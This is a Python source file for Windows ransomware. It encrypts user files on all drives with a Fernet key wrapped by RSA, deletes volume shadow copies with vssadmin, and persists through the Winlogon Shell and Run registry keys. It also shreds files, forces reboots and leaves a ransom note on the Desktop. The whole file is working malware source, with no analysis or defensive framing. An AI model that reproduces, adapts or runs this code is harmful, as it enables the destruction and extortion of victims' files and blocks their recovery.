import os
import sys
import string
import random
import base64
import threading
import subprocess
from winreg import *
from utilities import utility
from Cryptodome import Random
from Cryptodome.PublicKey import RSA
from cryptography.fernet import Fernet
from Cryptodome.Cipher import PKCS1_OAEP

class ransomware:
    util = utility()
    
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")     #Desktop path
    note_path = os.path.join(desktop_path, "Note.txt")      #Path for the note
    safe_mode_register = [r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell"]   #Safe mode register path and name
    run_register = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "GatewayFQDN"]        #Run register path and name
    
    #The note that will be written when the encryption ends
    desktop_note = """If you see this text, then all of your files including your Photos, Documents, Videos... have been encrypted.
They are NO LONGER accessible.
Please save yourself a couple of hours, by not searching for a decryption service, because that won't work.
How to get my files back?
Just wait. If you go back to your taskbar, you can see that it offered decryption. If you want your files back, enter either "Y" or "y".
"""
    
    root_directories = ["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"]
    ignore_paths = ["tmp", "winnt", "Application Data", "appdata", "temp", "thumb", "$recycle.bin", "Program Files", "Program Files (x86)", "System Volume Information", "Windows", "Boot", "Bios", "Windows.old", "Program Data"]
    ignore_extensions = [".exe", ".dll", ".sys", ".msi", ".bat", ".ini"]        #What files should we ignore
    
    def __init__(self, root_dirs, key_length = 4096):
        self.key = None
        self.crypter = None
        self.private_key = None
        self.public_key = None
        
        #Get current path
        if self.util.is_running_as_exe():
            self.current_path = sys.executable
        else:
            self.current_path = os.path.abspath(__file__)
        
        self.key_length = key_length
        self.extensions = self.ignore_extensions.copy()
        
        #All the rest is removing all the drives who doesn't exist 
        temp_list = []
        
        for file in root_dirs:
            if os.path.exists(file):
                temp_list.append(file)
        
        self.root_directories = temp_list.copy()
    
    def generate_keys(self):
        """Generate the Public and Private keys"""
        
        random = Random.new().read
        key = RSA.generate(self.key_length, random)
        
        self.private_key = key.exportKey()
        self.public_key = key.publickey().export_key()

    def generate_fernet(self):
        """Generate fernet key"""
        
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)
        
    def encrypt_fernet_key(self, pub_key):
        """Encrypt the fernet key, once encryption is done"""
        
        pub_key = RSA.import_key(pub_key)
        public_crypter =  PKCS1_OAEP.new(pub_key)
        
        self.key = public_crypter.encrypt(self.key)
        self.crypter = None

    def decrypt_fernet_key(self, priv_key):
        """Decrypt the fernet key"""
        
        priv_key = RSA.import_key(priv_key)
        private_crypter = PKCS1_OAEP.new(priv_key)
        
        self.key = private_crypter.decrypt(self.key)
    
    def restore_system(self):
        """Decrypt the system"""
        
        self.crypter = Fernet(self.key)
        self.crypt_system(False)

    def crypt_file(self, path, encrypt=True):
        """Encrypt\Decrypt a file"""
        
        try:
            tmp, extension = os.path.splitext(path)    
            if extension.lower() not in self.extensions and str(path).lower() != self.current_path.lower():    #Should we skip this file?
                with open(path, 'rb') as file:
                    data = file.read()
                
                if encrypt:
                    modified_data = self.crypter.encrypt(data)
                else:
                    modified_data = self.crypter.decrypt(data)
                
                with open(path, 'wb') as file:
                    file.write(modified_data)
        except Exception as e:
            print(e)
    
    def crypt_directory(self, root, files, encrypt=True):
        for file in files:
            file_path = os.path.join(root, file)
            self.crypt_file(file_path, encrypt)
    
    def handle_directory(self, directory_path, encrypt=True):
        """Multi threaded Encrypt\Decrypt a directory"""
        
        try:
            threads = []
            for root, dirs, files in os.walk(directory_path):
                thread = threading.Thread(target=self.crypt_directory, args=(root, files, encrypt, ))
                thread.daemon = True
                threads.append(thread)
                
            for t in threads:
                t.start()
                
            for t in threads:
                t.join()
        
        except Exception as e:
            print(e)
    
    def crypt_system(self, encrypt=True):
        """Encrypt\Decrypt each drive: C, D..."""
        
        try:
            threads = []
            for drive in self.root_directories:
                all = os.scandir(drive)
                for item in all:
                    path = item.path
                    if item.is_dir():
                        if os.path.basename(path).lower() not in self.ignore_paths:
                            thread = threading.Thread(target=self.handle_directory, args=(path, encrypt, ))
                        else:
                            continue
                    else:
                        thread = threading.Thread(target=self.crypt_file, args=(path, encrypt, ))
                    
                    thread.daemon = True
                    threads.append(thread)
                        
            for t in threads:
                t.start()
            
            for t in threads:
                t.join()
        except Exception as e:
            #print("L: ", e)
            print(" ")

    def shred_file(self, path, times_to_repeat=5):
        """Shred and not just delete"""
        
        try:
            f = open(path, 'w').close()
            for i in range(times_to_repeat):
                data = base64.b85encode(base64.b64encode(self.generate_random_string(400).encode()))
                data += os.urandom(len(data))
                with open(path, "wb") as file:                
                    file.write(data)    #Write junk to file
            
            name = self.generate_random_string(30)
            os.rename(path, name)   #Rename file
            os.unlink(name)     #Delete file
        except Exception as e:
            print(e)

    def become_persistent(self):
        """Write ourself to the registry"""
        
        self.util.modify_register(HKEY_LOCAL_MACHINE, self.safe_mode_register[0], self.safe_mode_register[1], ["explorer.exe", self.current_path])
        self.util.modify_register(HKEY_LOCAL_MACHINE, self.run_register[0], self.run_register[1], [self.current_path])

    def restore_registry_keys(self):
        if self.is_reg_exists(HKEY_LOCAL_MACHINE, self.run_register[0], self.run_register[1]):
            self.util.delete_register(HKEY_LOCAL_MACHINE, self.run_register[0], self.run_register[1])
        
        self.util.modify_register(HKEY_LOCAL_MACHINE, self.safe_mode_register[0], self.safe_mode_register[1], ["explorer.exe"])
    
    def is_reg_exists(self, as_who, reg_path, reg_name, reg_value=None):
        """Does the specified registry exists"""
        
        reg_key = OpenKey(as_who, reg_path, 0, KEY_ALL_ACCESS)
        for i in range(1024):
            try:
                (name, value, type) = EnumValue(reg_key, i)
                if name == reg_name:
                    if reg_value == None:   #If the reg exists, and we don't want to check for specific value
                        return True
                    else:
                        if reg_value == str(value): #If this specific value exists
                            return True
            except WindowsError:
                return False    #No more registries
            except Exception as e:
                continue
        
        return False
    
    def already_executed(self):
        """Did we already run this program"""
        return self.is_reg_exists(HKEY_LOCAL_MACHINE, self.safe_mode_register[0], self.safe_mode_register[1], str(self.current_path).lower()) or self.is_reg_exists(HKEY_LOCAL_MACHINE, self.run_register[0], self.run_register[1])
    
    def delete_shadow_copies(self):
        """Delete shadow copies"""
        
        first_command = "vssadmin Delete Shadows /all /quiet"
        resize_commands = ["vssadmin resize shadowstorage /for={}: /on={}: /maxsize=401MB", "vssadmin resize shadowstorage /for={}: /on={}: /maxsize=unbounded"]
        
        self.util.run_cmd_command(first_command)
        for dir in self.root_directories:
            dir_letter = dir[0]
            
            self.util.run_cmd_command(resize_commands[0].format(dir_letter, dir_letter))
            self.util.run_cmd_command(resize_commands[1].format(dir_letter, dir_letter))
        
        self.util.run_cmd_command(first_command)

    def change_boot_state(self, reboot=True):
        """Reboot the system into Regular Mode"""
        
        try:
            if reboot:
                self.util.run_cmd_command(r"shutdown /r /t 0")
            else:
                self.util.run_cmd_command(r"shutdown /r /t 0")
            
            self.util.run_cmd_command("shutdown /r /t 0")            
        except Exception as e:
            print(e)

    def add_notes(self):
        """Leave a note"""
        
        try:
            with open(self.note_path, 'w') as file:
                file.write(self.desktop_note)
            
            subprocess.Popen(["notepad.exe", self.note_path])   #Open the note
        except Exception as e:
            print(e)
        
    @staticmethod
    def generate_random_string(length):
        """Generate a random string of length n"""
        
        try:
            return "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(length))
        except Exception as e:
            print(e)


        